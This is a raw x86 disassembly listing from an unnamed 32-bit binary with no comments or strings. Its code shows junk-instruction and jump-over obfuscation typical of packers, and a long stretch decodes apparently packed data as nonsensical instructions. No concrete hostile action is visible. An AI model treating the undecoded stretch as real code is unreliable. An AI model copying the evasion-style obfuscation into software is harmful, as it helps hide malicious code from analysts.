  418eaf:	adc    DWORD PTR [ebx-0x7436dd00],ecx
  418eb5:	enter  0xf181,0xaf
  418eb9:	call   0x835f:0x3d83a406
  418ec0:	inc    edx
  418ec1:	add    BYTE PTR [eax],al
  418ec3:	mov    DWORD PTR ds:0x428127,0x216c
  418ecd:	mov    DWORD PTR ds:0x42822b,0x28e7
  418ed7:	mov    DWORD PTR ds:0x428223,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x428233,0x562c
  418ef0:	mov    DWORD PTR ds:0x42825b,0x3af5
  418efa:	cmp    DWORD PTR ds:0x42835f,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x4282e7
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428db4
  418f1a:	not    DWORD PTR ds:0x42815b
  418f20:	sub    DWORD PTR ds:0x42834f,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428113
  418f32:	mov    edx,DWORD PTR ds:0x428257
  418f38:	sbb    DWORD PTR ds:0x42833b,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x428293
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x4282cb,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x42834f,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x428363,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x4282bb,0x0
  418f6c:	not    DWORD PTR ds:0x428227
  418f72:	not    DWORD PTR ds:0x428157
  418f78:	mov    DWORD PTR ds:0x4282af,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x4282df
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x4282bb,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x42833b
  418fb5:	call   DWORD PTR ds:0x428db8
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x4281ef,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x42814f
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x42833f,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x42814b,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x42812f,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42811f,0x0
  41900e:	mov    DWORD PTR ds:0x428133,0x4347
  419018:	mov    DWORD PTR ds:0x428157,0x6064
  419022:	mov    DWORD PTR ds:0x42823f,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428213,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42811f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428dbc
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x4282af
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x4281eb
  41906c:	or     DWORD PTR ds:0x42832f,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
  41908f:	call   DWORD PTR [esi-0x548f3402]
  419095:	push   cs
  419096:	cmp    edi,DWORD PTR [esi+0x1816c33f]
  41909c:	mov    esp,0x39181812
  4190a1:	add    eax,0x7df1f6a4
  4190a6:	mov    ch,0x6f
  4190a8:	mov    ecx,0xc4079b91
  4190ad:	pop    esp
  4190ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190af:	mov    ?,WORD PTR [esi+0x20c14183]
  4190b5:	(bad)  
  4190b6:	les    edi,FWORD PTR [ebx-0x1a]
  4190b9:	push   edx
  4190ba:	xchg   edi,eax
  4190bb:	loop   0x41908a
  4190bd:	dec    esp
  4190be:	leave  
  4190bf:	repnz dec edx
  4190c1:	pop    ebp
  4190c2:	arpl   WORD PTR [eax],di
  4190c4:	adc    BYTE PTR [esi-0x5d],bh
  4190c7:	mov    WORD PTR [ebx+0x28],fs
  4190ca:	ds popf 
  4190cc:	aad    0xde
  4190ce:	pop    esi
  4190cf:	inc    eax
  4190d0:	imul   esi,ecx,0x91ec7422
  4190d6:	enter  0x6304,0xb6
  4190da:	push   0x89fd629a
  4190df:	ja     0x419069
  4190e1:	push   esp
  4190e2:	mov    BYTE PTR [ecx+esi*2+0x63],bl
  4190e6:	mov    edi,0x1587eac6
  4190eb:	mov    esp,0xb56fa9ad
  4190f0:	sbb    esi,esp
  4190f2:	aam    0x5e
  4190f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190f5:	sub    BYTE PTR [edx-0x67],al
  4190f8:	pushf  
  4190f9:	jbe    0x4190a0
  4190fb:	push   edi
  4190fc:	push   esi
  4190fd:	and    edi,ebp
  4190ff:	out    dx,eax
  419100:	repz jmp 0x62e7cc78
  419106:	cmp    BYTE PTR [ebx+0x55],ch
  419109:	push   edi
  41910a:	dec    eax
  41910b:	lods   al,BYTE PTR ds:[esi]
  41910c:	out    dx,al
  41910d:	jbe    0x41912c
  41910f:	add    esi,edx
  419111:	xor    al,0x33
  419113:	cmp    eax,0xec739437
  419118:	add    BYTE PTR [edx],bh
  41911a:	(bad)  
  41911b:	popa   
  41911c:	fild   WORD PTR [ebx-0x74]
  41911f:	push   edi
  419120:	daa    
  419121:	jbe    0x41917d
  419123:	mov    ds:0x2d1a3a1a,eax
  419128:	sub    al,0xc6
  41912a:	push   ebp
  41912b:	mov    ch,0xb5
  41912d:	mov    edx,0x3070d60b
  419132:	mov    ds:0xe482fd7d,al
  419137:	sbb    eax,edi
  419139:	daa    
  41913a:	pop    edi
  41913b:	nop
  41913c:	dec    esp
  41913d:	sub    BYTE PTR [eax],ch
  41913f:	jge    0x4190d7
  419141:	xor    al,0x8c
  419143:	cmc    
  419144:	sub    eax,DWORD PTR [ecx]
  419146:	mov    ebp,DWORD PTR [ebx-0x58a25b44]
  41914c:	xlat   BYTE PTR ds:[ebx]
  41914d:	fwait
  41914e:	pop    ebx
  41914f:	sbb    BYTE PTR [edi-0x56],cl
  419152:	cli    
  419153:	sti    
  419154:	or     eax,0x1fdabc8c
  419159:	int    0xaa
  41915b:	push   esp
  41915c:	shl    DWORD PTR ds:[esi-0x41],1
  419160:	es xor edi,edx
  419163:	xor    ch,BYTE PTR [edx]
  419165:	xchg   ebx,eax
  419166:	shr    DWORD PTR [esi+0x61],cl
  419169:	mov    ecx,0x7819257b
  41916e:	jp     0x419186
  419170:	rcl    BYTE PTR [ecx],1
  419172:	shr    BYTE PTR [ecx-0x69a205ba],cl
  419178:	fsubr  QWORD PTR [ebx+0x72]
  41917b:	fdiv   DWORD PTR [ebx-0x795f6953]
  419181:	pop    eax
  419182:	imul   eax,DWORD PTR [eax-0x4e0285f9],0x14
  419189:	pop    eax
  41918a:	adc    eax,0xc0486eb8
  41918f:	repz or eax,0xc11d6df1
  419195:	jnp    0x419157
  419197:	(bad)  
  419198:	push   esp
  419199:	popa   
  41919a:	mov    ds:0x5d7a4c2d,eax
  41919f:	jge    0x419153
  4191a1:	ror    DWORD PTR [esp+eiz*4-0x1d],0x54
  4191a6:	or     BYTE PTR [edx],0xf9
  4191a9:	cmp    eax,0xd26a1a5c
  4191ae:	out    dx,al
  4191af:	arpl   WORD PTR [edi-0x6f],bp
  4191b2:	lahf   
  4191b3:	enter  0x71d7,0xce
  4191b7:	call   0xb7fa:0x106ccc24
  4191be:	(bad)  
  4191bf:	stos   DWORD PTR es:[edi],eax
  4191c0:	mov    ds:0xff6368f7,al
  4191c5:	and    BYTE PTR [ebx+0x50],0x8b
  4191c9:	shl    DWORD PTR [esi*8+0x170b991e],0xe9
  4191d1:	inc    ebx
  4191d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191d3:	sub    BYTE PTR [edx+ebp*4-0x41],0x2b
  4191d8:	retf   0xaf38
  4191db:	mov    ds:0x16ea2e9f,al
  4191e0:	lea    esi,[ebx+0x19]
  4191e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191e4:	add    eax,0x5ea680d7
  4191e9:	mov    ds:0x36cf01,eax
  4191ee:	ss loope 0x419228
  4191f1:	add    eax,0xa700c343
  4191f6:	and    ch,BYTE PTR [eax+0x77]
  4191f9:	cwde   
  4191fa:	cmp    al,BYTE PTR [edx+0x2969cf22]
  419200:	or     esp,DWORD PTR [eax-0x2a]
  419203:	cmp    al,0xaa
  419205:	add    ecx,DWORD PTR [eax-0x694d1ed9]
  41920b:	dec    eax
  41920c:	adc    bh,ah
  41920e:	mov    ds:0x612d681b,eax
  419213:	mov    al,ds:0x18324fa5
  419218:	repnz leave 
  41921a:	or     DWORD PTR [eax],eax
  41921c:	adc    eax,0x4e4b04d3
  419221:	scas   eax,DWORD PTR es:[edi]
  419222:	mov    ah,0x49
  419224:	retf   0xf0db
  419227:	push   ebx
  419228:	popa   
  419229:	xor    al,0x1c
  41922b:	adc    eax,0x333341a2
  419230:	jb     0x4192a2
  419232:	icebp  
  419233:	push   ebx
  419234:	test   BYTE PTR [edx],al
  419236:	mov    eax,0x9be78031
  41923b:	leave  
  41923c:	push   ebx
  41923d:	xchg   ax,ax
  41923f:	xchg   ebp,eax
  419240:	retf   0xf3cf
  419243:	cdq    
  419244:	inc    esp
  419245:	and    al,0x82
  419247:	loopne 0x4191dc
  419249:	mov    cl,0xf
  41924b:	test   DWORD PTR [esi+0x21],esi
  41924e:	loope  0x419214
  419250:	aas    
  419251:	lods   al,BYTE PTR ds:[esi]
  419252:	out    0x98,al
  419254:	sub    edi,ebx
  419256:	mov    DWORD PTR [edi+0x7a],ebx
  419259:	mov    al,ds:0xe4b8cfd2
  41925e:	mov    al,ds:0x87df1e8a
  419263:	sbb    BYTE PTR [esi],0xc1
  419266:	scas   eax,DWORD PTR es:[edi]
  419267:	jne    0x419262
  419269:	add    eax,DWORD PTR [edx+0xe86a32e]
  41926f:	outs   dx,DWORD PTR ds:[esi]
  419270:	xor    al,0xbd
  419272:	jecxz  0x41929c
  419274:	xchg   DWORD PTR [edx+0x163825fc],ebx
  41927a:	les    edx,FWORD PTR [esi+0x6c5bce4]
  419280:	ficomp DWORD PTR cs:[ecx+0x56]
  419284:	nop
  419285:	scas   al,BYTE PTR es:[edi]
  419286:	sti    
  419287:	mov    ds:0x3c38c3bb,al
  41928c:	(bad)  
  41928d:	mov    cl,0xf2
  41928f:	and    al,0x54
  419291:	pushf  
  419292:	sbb    dh,BYTE PTR [ebx+0x36c31675]
  419298:	inc    edx
  419299:	call   0x9b02:0x7323c4ce
  4192a0:	xacquire xchg DWORD PTR [eax+ebp*4+0x6abee7a5],eax
  4192a8:	cdq    
  4192a9:	sub    al,0x55
  4192ab:	mov    edx,0x686a96e2
  4192b0:	sub    edx,ecx
  4192b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192b3:	inc    esi
  4192b4:	sub    cl,dl
  4192b6:	cmp    eax,0x6722a920
  4192bb:	shl    BYTE PTR [edi+ebp*1-0x21],1
  4192bf:	mov    esp,0x6af6699a
  4192c4:	adc    BYTE PTR [eax],dl
  4192c6:	jo     0x419258
  4192c8:	jbe    0x41925d
  4192ca:	xchg   ebp,eax
  4192cb:	aaa    
  4192cc:	push   0x4e2bed20
  4192d1:	xor    eax,0xb15e0b3f
  4192d6:	stos   DWORD PTR es:[edi],eax
  4192d7:	xor    BYTE PTR [eax],ch
  4192d9:	or     ecx,DWORD PTR [ebx-0x60]
  4192dc:	mov    esp,0x11613521
  4192e1:	ins    BYTE PTR es:[edi],dx
  4192e2:	sub    DWORD PTR [ecx-0x4],ebp
  4192e5:	mov    al,ds:0x48e78c31
  4192ea:	inc    BYTE PTR [eax]
  4192ec:	stos   DWORD PTR es:[edi],eax
  4192ed:	aaa    
  4192ee:	mov    esp,DWORD PTR [esp+eiz*2-0x11]
  4192f2:	inc    esi
  4192f3:	fbld   TBYTE PTR [ebp-0x6759c823]
  4192f9:	cmp    dl,dl
  4192fb:	sahf   
  4192fc:	cli    
  4192fd:	in     eax,0x40
  4192ff:	lahf   
  419300:	pop    es
  419301:	cs cmc 
  419303:	xor    ebx,DWORD PTR [ebp-0x598c578d]
  419309:	sbb    eax,0x121b9b9f
  41930e:	mov    DWORD PTR [ebx],ebp
  419310:	fild   DWORD PTR [ecx-0x77194b6]
  419316:	jbe    0x419397
  419318:	or     al,0xb1
  41931a:	inc    esi
  41931b:	mov    dl,BYTE PTR [edx+0x54]
  41931e:	test   al,0x12
  419320:	sub    al,0x9
  419322:	push   ecx
  419323:	cwde   
  419324:	ins    DWORD PTR es:[edi],dx
  419325:	fstp   DWORD PTR [ecx-0x49ad3d89]
  41932b:	jmp    0x419366
  41932d:	mov    ch,0xdd
  41932f:	popf   
  419330:	pop    eax
  419331:	sahf   
  419332:	mov    esi,0x3703998
  419337:	push   ds
  419338:	dec    ecx
  419339:	mov    ebp,0xf677eef6
  41933e:	loope  0x419349
  419340:	pusha  
  419341:	sar    BYTE PTR [esi-0x7b],0xed
  419345:	jo     0x419348
  419347:	lds    edx,FWORD PTR [esi]
  419349:	mov    al,0x34
  41934b:	rcl    edx,cl
  41934d:	push   es
  41934e:	sbb    DWORD PTR [esi],esi
  419350:	cmp    bl,BYTE PTR [ecx+0x68]
  419353:	outs   dx,BYTE PTR ds:[esi]
  419354:	add    eax,0xa8250c69
  419359:	add    esi,DWORD PTR [ebp+0x23]
  41935c:	and    BYTE PTR ds:0xf211cb16,bh
  419362:	jno    0x419396
  419364:	(bad)  
  419365:	mov    eax,ds:0xa756267e
  41936a:	(bad)  
  41936b:	das    
  41936c:	out    dx,al
  41936d:	jne    0x419389
  41936f:	mov    ah,0xd8
  419371:	shl    DWORD PTR [eax-0x19],0x8f
  419375:	sbb    ch,dl
  419377:	(bad)  
  419378:	ficom  DWORD PTR [edi-0x14]
  41937b:	mov    dl,0xc4
  41937d:	retf   
  41937e:	inc    eax
  41937f:	jbe    0x419341
  419381:	mov    eax,ds:0x6b7b96bc
  419386:	inc    ebx
  419387:	call   0xaa7e680c
  41938c:	add    bl,bh
  41938e:	jmp    0x2b3e:0x2af8c36
  419395:	push   ss
  419396:	(bad)  
  419397:	sbb    edi,DWORD PTR ds:0xf860bbb
  41939d:	jecxz  0x41935d
  41939f:	xchg   ebx,eax
  4193a0:	or     al,BYTE PTR [edi]
  4193a2:	cmp    al,0x3
  4193a4:	mov    dh,0x1f
  4193a6:	xchg   BYTE PTR [eax],cl
  4193a8:	stos   BYTE PTR es:[edi],al
  4193a9:	mov    dh,0x33
  4193ab:	enter  0xc207,0x8a
  4193af:	sti    
  4193b0:	retf   0x4bd3
  4193b3:	jo     0x4193a4
  4193b5:	jg     0x419357
  4193b7:	pop    ss
  4193b8:	jnp    0x4193f0
  4193ba:	cmp    al,0x5d
  4193bc:	inc    edi
  4193bd:	mov    cl,0x8e
  4193bf:	out    0x71,al
  4193c1:	sbb    eax,0x9da34184
  4193c6:	outs   dx,BYTE PTR ds:[esi]
  4193c7:	cmp    BYTE PTR [ecx],0x8d
  4193ca:	cli    
  4193cb:	fwait
  4193cc:	mov    cs,WORD PTR [edi+esi*2+0x18]
  4193d0:	nop
  4193d1:	push   es
  4193d2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193d4:	out    0x94,eax
  4193d6:	inc    edx
  4193d7:	fs call 0x62d3c797
  4193dd:	jnp    0x419365
  4193df:	in     eax,dx
  4193e0:	inc    ebx
  4193e1:	icebp  
  4193e2:	xchg   edi,eax
  4193e3:	mov    al,ds:0x7cb809ea
  4193e8:	leave  
  4193e9:	into   
  4193ea:	or     DWORD PTR [edx-0x6cf41024],edi
  4193f0:	pop    edi
  4193f1:	xchg   ebx,eax
  4193f2:	popf   
  4193f3:	das    
  4193f4:	or     ax,0xe190
  4193f8:	mov    bl,0x9e
  4193fa:	jmp    0x93baa006
  4193ff:	jge    0x419471
  419401:	scas   eax,DWORD PTR es:[edi]
  419402:	jl     0x4193d3
  419404:	std    
  419405:	pop    eax
  419406:	fcomp  QWORD PTR [ebp+0x3589fadf]
  41940c:	fstp   TBYTE PTR [eax+0x64]
  41940f:	cld    
  419410:	mov    cl,BYTE PTR [edi+0x22]
  419413:	nop
  419414:	and    edx,DWORD PTR [ebx+0x3826710b]
  41941a:	sub    al,0x1d
  41941c:	mov    ch,0x44
  41941e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41941f:	sar    ah,cl
  419421:	(bad)  
  419422:	test   ebp,0x4faacbee
  419428:	in     al,0x31
  41942a:	jne    0x4193fb
  41942c:	mov    WORD PTR [eax-0x3c16eecc],ss
  419432:	jle    0x4193b8
  419434:	ins    DWORD PTR es:[edi],dx
  419435:	mov    esp,0x214ac55
  41943a:	sub    al,0xff
  41943c:	xchg   ebx,eax
  41943d:	push   0xfffffffa
  41943f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419440:	and    eax,0xcba17108
  419445:	sbb    bl,BYTE PTR [ebx-0x672f0634]
  41944b:	cwde   
  41944c:	ds scas eax,DWORD PTR es:[edi]
  41944e:	fucom  st(3)
  419450:	cld    
  419451:	test   eax,0x84248c8b
  419456:	add    BYTE PTR [eax],al
  419458:	add    BYTE PTR [edi],cl
  41945a:	lods   al,BYTE PTR ds:[esi]
  41945b:	enter  0x8302,0x3d
  41945f:	inc    DWORD PTR [ecx-0x76ffffbe]
  419465:	sbb    eax,0x428357
  41946a:	not    edx
  41946c:	not    edx
  41946e:	jmp    0x419554
  419473:	mov    edx,0x1545
  419478:	mov    DWORD PTR ds:0x428363,0x3a28
  419482:	cmp    DWORD PTR ds:0x4281ff,0x0
  419489:	jae    0x4194bc
  41948f:	push   0x7047
  419494:	call   DWORD PTR ds:0x428dc0
  41949a:	mov    DWORD PTR ds:0x42823b,0x5c93
  4194a4:	mov    edx,DWORD PTR ds:0x4282a3
  4194aa:	mov    edx,DWORD PTR [edx]
  4194ac:	sbb    DWORD PTR ds:0x4282db,edx
  4194b2:	mov    DWORD PTR ds:0x428263,0x52b1
  4194bc:	or     DWORD PTR ds:0x42813b,edx
  4194c2:	and    DWORD PTR ds:0x42833f,ecx
  4194c8:	cmp    DWORD PTR ds:0x4282e7,0x0
  4194cf:	mov    DWORD PTR ds:0x4282e7,0x47af
  4194d9:	mov    edx,0x1450
  4194de:	mov    edx,0x7667
  4194e3:	mov    DWORD PTR ds:0x428263,0x72a1
  4194ed:	jmp    0x419554
  4194f2:	mov    DWORD PTR ds:0x428363,0x1b74
  4194fc:	mov    DWORD PTR ds:0x42813f,0x3203
  419506:	cmp    DWORD PTR ds:0x4282e7,0x0
  41950d:	jge    0x41953e
  419513:	push   0x42807b
  419518:	push   0x42805f
  41951d:	push   0x400000
  419522:	call   DWORD PTR ds:0x428e54
  419528:	adc    DWORD PTR ds:0x428147,0x266f
  419532:	xor    DWORD PTR ds:0x42833f,ebx
  419538:	xor    DWORD PTR ds:0x4282c7,ecx
  41953e:	mov    DWORD PTR ds:0x428137,0x7c57
  419548:	adc    edx,DWORD PTR ds:0x428213
  41954e:	dec    DWORD PTR ds:0x4282c7
  419554:	shr    ecx,0x2
  419557:	mov    ecx,DWORD PTR [esp+0x80]
  41955e:	xor    DWORD PTR ds:0x4282b7,0x502d
  419568:	mov    edx,DWORD PTR [esp+0x84]
  41956f:	xor    eax,0x329e695d
  419574:	xor    DWORD PTR ds:0x42834b,0x428367
  41957e:	xor    edx,edx
  419580:	or     edx,eax
  419582:	cmp    DWORD PTR ds:0x42814f,0x0
  419589:	mov    DWORD PTR ds:0x42813f,0x514f
  419593:	mov    DWORD PTR ds:0x428143,0x65eb
  41959d:	mov    DWORD PTR ds:0x4281f3,0x8ef
  4195a7:	jmp    0x4195fe
  4195ac:	mov    DWORD PTR ds:0x428253,0x70f3
  4195b6:	mov    eax,0x339d
  4195bb:	cmp    DWORD PTR ds:0x42814f,0x0
  4195c2:	jne    0x4195e8
  4195c8:	push   0x42800d
  4195cd:	push   0x428029
  4195d2:	call   DWORD PTR ds:0x428e58
  4195d8:	adc    DWORD PTR ds:0x428267,ecx
  4195de:	and    DWORD PTR ds:0x42825b,0x4c04
  4195e8:	add    DWORD PTR ds:0x428133,ebx
  4195ee:	and    DWORD PTR ds:0x42823f,0x6136
  4195f8:	add    DWORD PTR ds:0x428147,ebx
  4195fe:	mov    eax,ds:0x422518
  419603:	and    DWORD PTR ds:0x4282cf,0x428237
  41960d:	push   edx
  41960e:	push   DWORD PTR [eax+0x19c]
  419614:	lea    eax,[esp+0x80]
  41961b:	sub    DWORD PTR ds:0x42812b,0x231c
  419625:	push   eax
  419626:	sub    DWORD PTR ds:0x428153,0x428127
  419630:	shl    ecx,0x1e
  419633:	and    DWORD PTR ds:0x428237,0x7ddf
  41963d:	call   0x415231
  419642:	lea    eax,[ebp+0x10]
  419645:	or     DWORD PTR ds:0x428267,0x7c72
  41964f:	push   eax
  419650:	mov    DWORD PTR [esp+0x14],edi
  419654:	mov    DWORD PTR [esp+0x18],esi
  419658:	lea    eax,[ebp+0xc]
  41965b:	push   eax
  41965c:	neg    DWORD PTR ds:0x42823f
  419662:	mov    DWORD PTR [esp+0x18],edi
  419666:	lea    eax,[ebp+0x8]
  419669:	add    DWORD PTR ds:0x428253,0x7c30
  419673:	mov    DWORD PTR [esp+0x1c],esi
  419677:	mov    DWORD PTR [esp+0x18],edi
  41967b:	adc    DWORD PTR ds:0x428143,0x428113
  419685:	mov    DWORD PTR [esp+0x1c],esi
  419689:	sbb    DWORD PTR ds:0x428247,0x42820f
  419693:	push   eax
  419694:	neg    DWORD PTR ds:0x42812b
  41969a:	call   0x40cc09
  41969f:	push   0x4
  4196a1:	and    DWORD PTR ds:0x42812b,0x4282b7
  4196ab:	push   0x42239c
  4196b0:	sbb    DWORD PTR ds:0x428243,0x30c9
  4196ba:	push   DWORD PTR [esp+0x14]
  4196be:	sbb    DWORD PTR ds:0x4281eb,0x560d
  4196c8:	call   0x415231
  4196cd:	sub    ecx,ebx
  4196cf:	mov    eax,DWORD PTR [esp+0xc]
  4196d3:	movzx  ebx,BYTE PTR ds:0x4281ff
  4196da:	sbb    DWORD PTR ds:0x4282e3,ebx
  4196e0:	mov    ecx,DWORD PTR [esp+0xc]
  4196e4:	adc    DWORD PTR ds:0x428213,0x79e1
  4196ee:	mov    eax,DWORD PTR [eax]
  4196f0:	mov    ecx,DWORD PTR [ecx]
  4196f2:	shr    eax,0x1e
  4196f5:	add    DWORD PTR ds:0x42822f,ecx
  4196fb:	shl    ecx,0x2
  4196fe:	and    ebx,edx
  419700:	or     eax,ecx
  419702:	adc    DWORD PTR ds:0x4281fb,ebx
  419708:	mov    ecx,DWORD PTR [esp+0xc]
  41970c:	cmp    DWORD PTR ds:0x428333,0x0
  419713:	mov    edx,DWORD PTR ds:0x4282af
  419719:	mov    edx,0x8ae
  41971e:	mov    DWORD PTR ds:0x42822b,0x3b2
  419728:	jmp    0x419775
  41972d:	mov    DWORD PTR ds:0x428343,0x5836
  419737:	cmp    DWORD PTR ds:0x428333,0x0
  41973e:	jbe    0x419767
  419744:	push   DWORD PTR [ebp-0x24]
  419747:	call   DWORD PTR ds:0x428dc4
  41974d:	movzx  edx,BYTE PTR ds:0x42812b
  419754:	adc    DWORD PTR ds:0x4282b3,edx
  41975a:	movzx  edx,BYTE PTR ds:0x428267
  419761:	add    DWORD PTR ds:0x42814b,edx
  419767:	and    edx,edx
  419769:	sub    ebx,edx
  41976b:	or     DWORD PTR ds:0x42825f,0x6a01
  419775:	xor    eax,0xa4069aae
  41977a:	cmp    DWORD PTR ds:0x42814b,0x0
  419781:	mov    DWORD PTR ds:0x428213,ebx
  419787:	mov    ebx,0x3314
  41978c:	jmp    0x4197fe
  419791:	mov    DWORD PTR ds:0x42822b,ebx
  419797:	cmp    DWORD PTR ds:0x42814b,0x0
  41979e:	jb     0x4197dd
  4197a4:	push   0x7db2
  4197a9:	push   0x7dda
  4197ae:	push   0x6d09
  4197b3:	push   DWORD PTR [ebp-0x20]
  4197b6:	push   DWORD PTR [ebp-0x28]
  4197b9:	call   DWORD PTR ds:0x428dc8
  4197bf:	sub    DWORD PTR ds:0x428243,0x63b8
  4197c9:	add    DWORD PTR ds:0x4282bf,0x4281ff
  4197d3:	add    DWORD PTR ds:0x42821f,0x428147
  4197dd:	mov    ebx,DWORD PTR ds:0x428167
  4197e3:	xor    edx,edx
  4197e5:	add    edx,DWORD PTR ds:0x428277
  4197eb:	sub    ebx,edx
  4197ed:	sub    ebx,DWORD PTR [ebx+edx*1]
  4197f0:	sbb    ebx,ebx
  4197f2:	add    DWORD PTR ds:0x4281f7,ecx
  4197f8:	and    DWORD PTR ds:0x42824f,ecx
  4197fe:	mov    DWORD PTR [ecx],eax
  419800:	lea    eax,[esp+0x40]
  419804:	neg    edx
  419806:	mov    DWORD PTR [esp+0x98],eax
  41980d:	add    ecx,DWORD PTR ds:0x4282cf
  419813:	lea    eax,[esp+0x98]
  41981a:	or     edx,0x537a
  419820:	mov    DWORD PTR [esp+0x9c],eax
  419827:	cmp    DWORD PTR ds:0x42814b,0x0
  41982e:	not    ebx
  419830:	mov    DWORD PTR ds:0x428337,0x7e9e
  41983a:	mov    edx,0x7e32
  41983f:	jmp    0x419909
  419844:	mov    DWORD PTR ds:0x4282d7,0x6cf
  41984e:	mov    DWORD PTR ds:0x428363,0x6551
  419858:	cmp    DWORD PTR ds:0x42814b,0x0
  41985f:	jge    0x41988b
  419865:	push   0x4cee
  41986a:	push   0x2107
  41986f:	push   0x820f
  419874:	push   DWORD PTR [ebp-0x10]
  419877:	call   DWORD PTR ds:0x428e5c
  41987d:	adc    edx,edx
  41987f:	add    ecx,0x4be2
  419885:	and    ecx,0x5fef
  41988b:	mov    ebx,DWORD PTR ds:0x42836b
  419891:	mov    ecx,DWORD PTR ds:0x42836f
  419897:	sub    ebx,ecx
  419899:	or     ebx,DWORD PTR [ebx+ecx*1]
  41989c:	xor    ecx,DWORD PTR ds:0x42825b
  4198a2:	cmp    DWORD PTR ds:0x42811f,0x0
  4198a9:	mov    DWORD PTR ds:0x428113,0x2b9c
  4198b3:	movzx  ecx,WORD PTR ds:0x4282df
  4198ba:	not    DWORD PTR ds:0x4282d3
  4198c0:	jmp    0x419909
  4198c5:	mov    edx,0x5053
  4198ca:	cmp    DWORD PTR ds:0x42811f,0x0
  4198d1:	jne    0x4198eb
  4198d7:	call   DWORD PTR ds:0x428dcc
  4198dd:	sbb    ecx,ecx
  4198df:	not    DWORD PTR ds:0x428243
  4198e5:	and    DWORD PTR ds:0x4282db,edi
  4198eb:	mov    edx,DWORD PTR ds:0x4282af
  4198f1:	sbb    DWORD PTR ds:0x428137,edx
  4198f7:	or     DWORD PTR ds:0x4282c7,0x212d
  419901:	adc    edx,edx
  419903:	and    DWORD PTR ds:0x428233,edi
  419909:	mov    eax,DWORD PTR [esp+0x40]
  41990d:	sub    DWORD PTR [esp+0x40],eax
  419911:	mov    edx,DWORD PTR ds:0x4281df
  419917:	xor    ecx,ecx
  419919:	xor    ecx,DWORD PTR ds:0x4281e3
  41991f:	sub    edx,ecx
  419921:	or     edx,DWORD PTR [edx+ecx*1]
  419924:	lea    eax,[ebp+0x4]
  419927:	cmp    DWORD PTR ds:0x4282d7,0x0
  41992e:	mov    edx,0x60f5
  419933:	not    edx
  419935:	not    edx
  419937:	jmp    0x419a27
  41993c:	mov    DWORD PTR ds:0x4281eb,0x4551
  419946:	mov    DWORD PTR ds:0x42824f,0x487
  419950:	cmp    DWORD PTR ds:0x4282d7,0x0
  419957:	jne    0x419988
  41995d:	push   0x803a
  419962:	push   DWORD PTR [ebp-0x18]
  419965:	push   DWORD PTR [ebp-0x1c]
  419968:	push   0x318a
  41996d:	push   DWORD PTR [ebp-0x20]
  419970:	call   DWORD PTR ds:0x428dd0
  419976:	sbb    edx,ebx
  419978:	add    ecx,0x5f27
  41997e:	sbb    DWORD PTR ds:0x4282af,0x75a
  419988:	sub    DWORD PTR ds:0x428257,0x2f43
  419992:	movzx  ecx,BYTE PTR ds:0x4281fb
  419999:	sub    ecx,DWORD PTR ds:0x42835f
  41999f:	mov    DWORD PTR ds:0x4281fb,ecx
  4199a5:	cmp    DWORD PTR ds:0x42821b,0x0
  4199ac:	mov    DWORD PTR ds:0x4282b3,0x47a6
  4199b6:	mov    edx,0x1bf3
  4199bb:	mov    DWORD PTR ds:0x42811b,0x10c7
  4199c5:	mov    DWORD PTR ds:0x428337,0x1d16
  4199cf:	jmp    0x419a27
  4199d4:	mov    DWORD PTR ds:0x42821b,edi
  4199da:	cmp    DWORD PTR ds:0x42821b,0x0
  4199e1:	jge    0x419a0f
  4199e7:	push   0x4281f3
  4199ec:	push   0x427f1b
  4199f1:	call   DWORD PTR ds:0x428e60
  4199f7:	sub    DWORD PTR ds:0x428367,ecx
